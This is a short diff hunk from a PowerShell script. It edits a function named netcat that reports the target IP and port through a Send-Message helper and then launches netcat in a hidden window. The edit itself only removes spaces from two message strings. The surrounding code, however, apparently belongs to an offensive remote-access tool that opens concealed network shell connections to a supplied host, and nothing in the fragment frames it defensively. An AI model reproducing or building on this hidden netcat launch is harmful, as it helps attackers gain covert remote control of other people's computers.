@@ -535,8 +535,8 @@ function netcat($ip, $port) {
 
     Start-Sleep -Seconds 5
     Send-Message "Connecting.."
-    Send-Message "IP: $ip"
-    Send-Message "Port: $port"
+    Send-Message "IP:$ip"
+    Send-Message "Port:$port"
     Start-Process $netcat -ArgumentList $args -WindowStyle Hidden
 }
 
